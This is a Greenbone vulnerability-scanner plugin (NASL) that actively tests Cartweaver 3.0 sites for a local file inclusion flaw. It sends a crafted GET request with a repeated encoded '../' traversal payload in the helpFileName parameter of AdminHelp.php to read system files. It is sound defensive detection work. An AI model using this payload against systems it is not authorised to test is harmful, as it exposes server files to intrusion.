# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802997");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-10-16 17:35:45 +0530 (Tue, 16 Oct 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Cartweaver <= 3.0 LFI Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Cartweaver is prone to a local file inclusion (LFI)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via 'helpFileName' parameter to AdminHelp.php is
  not properly sanitised before being used.");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"Cartweaver version 3.0 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/79227");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55917");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/21989/");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if (!http_can_host_php(port: port))
  exit(0);

files = traversal_files();

foreach dir (make_list_unique("/", "/cartweaver", "/cartScripts", "/cw", http_cgi_dirs(port: port))){
  if (dir == "/")
    dir = "";

  url = dir + "/admin/helpfiles/AdminHelp.php";

  res = http_get_cache(port: port, item: url);
  if (!res || res !~ "^HTTP/1\.[01] 200" || ">Cartweaver" >!< res)
    continue;

  foreach file (keys(files)) {
    url = url + "?helpFileName=a/" + crap(data: "..%2f", length: 3 * 15) + files[file];

    if (http_vuln_check(port: port, url: url, pattern: file)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
